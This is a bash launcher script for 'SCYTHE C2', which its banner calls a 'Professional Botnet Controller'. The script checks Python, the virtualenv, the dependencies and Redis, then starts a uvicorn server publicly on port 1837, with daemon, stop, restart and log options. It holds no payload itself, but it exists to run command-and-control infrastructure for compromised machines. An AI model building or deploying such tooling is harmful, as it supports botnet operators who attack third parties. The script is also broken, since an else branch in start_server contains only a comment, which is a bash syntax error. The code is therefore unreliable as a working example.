#!/bin/bash
# ================================================================
# SCYTHE C2 - Startup Script
# Version: 1.0.0
# Description: Run the SCYTHE C2 backend server with proper environment
# ================================================================

set -e

# ========== COLOR CODES ==========
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ========== CONFIGURATION ==========
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

PROJECT_NAME="SCYTHE C2"
APP_MODULE="app.main:app"
DEFAULT_PORT=1837
DEFAULT_HOST="0.0.0.0"
PID_FILE="$SCRIPT_DIR/.scythe.pid"
LOG_FILE="$SCRIPT_DIR/logs/app.log"
ENV_FILE="$SCRIPT_DIR/.env"

# ========== FUNCTIONS ==========

print_banner() {
    echo -e "${CYAN}"
    echo "  ███████╗ ██████╗██╗   ██╗████████╗██╗  ██╗███████╗"
    echo "  ██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔════╝"
    echo "  ███████╗██║      ╚████╔╝    ██║   ███████║█████╗  "
    echo "  ╚════██║██║       ╚██╔╝     ██║   ██╔══██║██╔══╝  "
    echo "  ███████║╚██████╗   ██║      ██║   ██║  ██║███████╗"
    echo "  ╚══════╝ ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${BOLD}${GREEN}  SCYTHE C2 v1.0.0 - Professional Botnet Controller${NC}"
    echo -e "${BOLD}${CYAN}  ⚡ Ready to dominate.${NC}"
    echo ""
}

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -h, --help          Show this help message"
    echo "  -d, --dev           Run in development mode (auto-reload)"
    echo "  -p, --port PORT     Set API port (default: $DEFAULT_PORT)"
    echo "  -H, --host HOST     Set host (default: $DEFAULT_HOST)"
    echo "  -b, --background    Run in background (daemon mode)"
    echo "  -s, --stop          Stop the running server"
    echo "  -r, --restart       Restart the server"
    echo "  -l, --logs          Show live logs"
    echo ""
    echo "Examples:"
    echo "  $0                  # Start in production mode"
    echo "  $0 --dev            # Start with auto-reload (development)"
    echo "  $0 --background     # Start as daemon"
    echo "  $0 --stop           # Stop the daemon"
    echo "  $0 --logs           # View real-time logs"
    echo ""
}

check_redis() {
    echo -e "${YELLOW}🔍 Checking Redis...${NC}"
    if command -v redis-cli &> /dev/null; then
        if redis-cli ping &> /dev/null; then
            echo -e "${GREEN}✅ Redis is running.${NC}"
            return 0
        else
            echo -e "${RED}❌ Redis is not responding. Please start Redis:${NC}"
            echo "  sudo systemctl start redis-server  # Linux"
            echo "  brew services start redis          # macOS"
            echo "  docker run -d -p 6379:6379 redis   # Docker"
            exit 1
        fi
    else
        echo -e "${YELLOW}⚠️  redis-cli not found. Assuming Redis is running on localhost:6379${NC}"
    fi
}

check_python() {
    echo -e "${YELLOW}🔍 Checking Python...${NC}"
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Python3 not found. Please install Python 3.10+.${NC}"
        exit 1
    fi
    PYTHON_VERSION=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
    echo -e "${GREEN}✅ Python $PYTHON_VERSION detected.${NC}"
}

check_venv() {
    echo -e "${YELLOW}🔍 Checking virtual environment...${NC}"
    if [ -d "venv" ]; then
        echo -e "${GREEN}✅ Virtual environment found. Activating...${NC}"
        source venv/bin/activate
    elif [ -d ".venv" ]; then
        echo -e "${GREEN}✅ Virtual environment found. Activating...${NC}"
        source .venv/bin/activate
    else
        echo -e "${YELLOW}⚠️  No virtual environment found. Creating one...${NC}"
        python3 -m venv venv
        source venv/bin/activate
        echo -e "${GREEN}✅ Virtual environment created.${NC}"
    fi
}

install_deps() {
    echo -e "${YELLOW}🔍 Checking dependencies...${NC}"
    if [ -f "requirements.txt" ]; then
        # Check if installed
        if ! pip show fastapi &> /dev/null; then
            echo -e "${YELLOW}📦 Installing dependencies from requirements.txt...${NC}"
            pip install --upgrade pip
            pip install -r requirements.txt
            echo -e "${GREEN}✅ Dependencies installed.${NC}"
        else
            echo -e "${GREEN}✅ Dependencies already installed.${NC}"
        fi
    else
        echo -e "${RED}❌ requirements.txt not found.${NC}"
        exit 1
    fi
}

check_dirs() {
    echo -e "${YELLOW}🔍 Checking directories...${NC}"
    mkdir -p logs data app/templates app/static
    echo -e "${GREEN}✅ Directories verified.${NC}"
}

start_server() {
    local mode=$1
    local host=$2
    local port=$3
    local daemon=$4

    echo ""
    echo -e "${BOLD}${GREEN}🚀 Starting SCYTHE C2 Server...${NC}"
    echo -e "  Host: ${CYAN}$host${NC}"
    echo -e "  Port: ${CYAN}$port${NC}"
    echo -e "  Mode: ${CYAN}$mode${NC}"
    echo ""

    # Build uvicorn command
    local cmd="uvicorn $APP_MODULE --host $host --port $port --log-level info"

    if [ "$mode" == "dev" ]; then
        cmd="$cmd --reload"
        echo -e "${YELLOW}⚠️  Development mode with auto-reload enabled.${NC}"
    else
        # Production mode: no --reload flag
    fi

    if [ "$daemon" == "true" ]; then
        # Run in background
        echo -e "${YELLOW}📦 Running in background (daemon mode)...${NC}"
        nohup $cmd > $LOG_FILE 2>&1 &
        local pid=$!
        echo $pid > $PID_FILE
        echo -e "${GREEN}✅ Server started with PID: $pid${NC}"
        echo -e "${GREEN}📝 Logs: $LOG_FILE${NC}"
        echo -e "${CYAN}🌐 Dashboard: http://$host:$port/${NC}"
        echo -e "${CYAN}🔐 Admin: http://$host:$port/admin${NC}"
    else
        # Run in foreground
        echo -e "${GREEN}💻 Running in foreground (Ctrl+C to stop)${NC}"
        echo -e "${CYAN}🌐 Dashboard: http://$host:$port/${NC}"
        echo -e "${CYAN}🔐 Admin: http://$host:$port/admin${NC}"
        echo ""
        exec $cmd
    fi
}

stop_server() {
    if [ -f "$PID_FILE" ]; then
        local pid=$(cat $PID_FILE)
        if ps -p $pid > /dev/null 2>&1; then
            echo -e "${YELLOW}🛑 Stopping server (PID: $pid)...${NC}"
            kill $pid
            sleep 2
            if ps -p $pid > /dev/null 2>&1; then
                echo -e "${RED}⚠️  Force killing...${NC}"
                kill -9 $pid
            fi
            rm -f $PID_FILE
            echo -e "${GREEN}✅ Server stopped.${NC}"
        else
            echo -e "${YELLOW}⚠️  PID file exists but process not running. Cleaning up...${NC}"
            rm -f $PID_FILE
        fi
    else
        echo -e "${YELLOW}⚠️  No PID file found. Trying pkill...${NC}"
        pkill -f "uvicorn.*app.main" || echo -e "${YELLOW}⚠️  No running process found.${NC}"
    fi
}

show_logs() {
    if [ -f "$LOG_FILE" ]; then
        echo -e "${GREEN}📋 Showing live logs (Ctrl+C to exit)...${NC}"
        tail -f $LOG_FILE
    else
        echo -e "${RED}❌ Log file not found: $LOG_FILE${NC}"
        exit 1
    fi
}

# ========== PARSE ARGUMENTS ==========
MODE="prod"
HOST="$DEFAULT_HOST"
PORT="$DEFAULT_PORT"
DAEMON="false"
ACTION="start"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            usage
            exit 0
            ;;
        -d|--dev)
            MODE="dev"
            shift
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -H|--host)
            HOST="$2"
            shift 2
            ;;
        -b|--background)
            DAEMON="true"
            shift
            ;;
        -s|--stop)
            ACTION="stop"
            shift
            ;;
        -r|--restart)
            ACTION="restart"
            shift
            ;;
        -l|--logs)
            ACTION="logs"
            shift
            ;;
        *)
            echo -e "${RED}❌ Unknown option: $1${NC}"
            usage
            exit 1
            ;;
    esac
done

# ========== MAIN EXECUTION ==========
print_banner

case $ACTION in
    stop)
        stop_server
        exit 0
        ;;
    logs)
        show_logs
        exit 0
        ;;
    restart)
        echo -e "${YELLOW}🔄 Restarting server...${NC}"
        stop_server
        sleep 1
        # Continue to start
        ;;
    start)
        # Default: start
        ;;
esac

# Run checks and start
check_python
check_venv
install_deps
check_redis
check_dirs

# If restart, we already stopped; now start
start_server "$MODE" "$HOST" "$PORT" "$DAEMON"